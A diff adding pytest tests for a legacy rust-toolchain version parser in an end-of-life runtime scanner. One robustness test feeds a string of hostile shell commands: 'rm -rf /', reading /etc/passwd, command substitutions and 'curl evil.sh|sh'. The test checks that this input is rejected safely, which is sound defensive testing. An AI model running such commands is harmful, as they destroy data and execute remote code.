@@ -29,6 +29,7 @@ from dev_team.eolscan import (
     parse_python_version,
     parse_ruby_version,
     parse_runtime_txt,
+    parse_rust_toolchain_legacy,
     parse_rust_toolchain_toml,
     query_eol,
     scan_eol,
@@ -672,6 +673,78 @@ def test_detect_runtimes_seven_prior_products_unaffected_by_rust_support():
         ("php", "8.1"),
         ("python", "3.11.4"),
         ("ruby", "3.2.0"),
+    ]
+
+
+# --- parse_rust_toolchain_legacy ----------------------------------------------------
+
+
+def test_parse_rust_toolchain_legacy_concrete_version():
+    assert parse_rust_toolchain_legacy("1.75.0\n") == ("rust", "1.75.0")
+
+
+def test_parse_rust_toolchain_legacy_two_component_version():
+    assert parse_rust_toolchain_legacy("1.75\n") == ("rust", "1.75")
+
+
+def test_parse_rust_toolchain_legacy_target_triple_suffix_stripped():
+    assert parse_rust_toolchain_legacy("1.75.0-x86_64-unknown-linux-gnu\n") == (
+        "rust",
+        "1.75.0",
+    )
+
+
+@pytest.mark.parametrize("channel", ["stable\n", "stable-x86_64-unknown-linux-gnu\n"])
+def test_parse_rust_toolchain_legacy_named_channel_is_none(channel):
+    assert parse_rust_toolchain_legacy(channel) is None
+
+
+def test_parse_rust_toolchain_legacy_dated_nightly_is_none():
+    assert parse_rust_toolchain_legacy("nightly-2024-01-15\n") is None
+
+
+def test_parse_rust_toolchain_legacy_empty_or_whitespace_only_is_none():
+    assert parse_rust_toolchain_legacy("") is None
+    assert parse_rust_toolchain_legacy("   \n") is None
+
+
+def test_parse_rust_toolchain_legacy_pathological_input_never_raises_or_queries():
+    payload = "; rm -rf /`id`../../etc/passwd$(whoami)&&curl evil.sh|sh;" * 200
+    assert len(payload) > 10_000
+    assert parse_rust_toolchain_legacy(payload) is None
+
+    ws = InMemoryWorkspace({"rust-toolchain": payload})
+
+    def fetch(_product):
+        raise AssertionError("must not query endoflife.date for an undetected runtime")
+
+    scan = scan_eol(ws, fetch=fetch)
+    assert scan.runtimes == []
+    assert scan.queried is False
+
+
+def test_rust_toolchain_legacy_parser_registered():
+    assert _PARSERS["rust-toolchain"] is parse_rust_toolchain_legacy
+
+
+def test_detect_runtimes_rust_from_legacy_rust_toolchain_file():
+    ws = InMemoryWorkspace({"rust-toolchain": "1.75.0\n"})
+    assert detect_runtimes(ws) == [
+        Runtime(product="rust", version="1.75.0", manifest="rust-toolchain")
+    ]
+
+
+def test_detect_runtimes_no_legacy_rust_toolchain_unchanged_by_its_support():
+    ws = InMemoryWorkspace(
+        {
+            "composer.json": json.dumps({"require": {"php": "^8.1"}}),
+            "go.mod": "module example.com/foo\n\ngo 1.21\n",
+        }
+    )
+    runtimes = detect_runtimes(ws)
+    assert sorted((r.product, r.version, r.manifest) for r in runtimes) == [
+        ("go", "1.21", "go.mod"),
+        ("php", "8.1", "composer.json"),
     ]
 
 
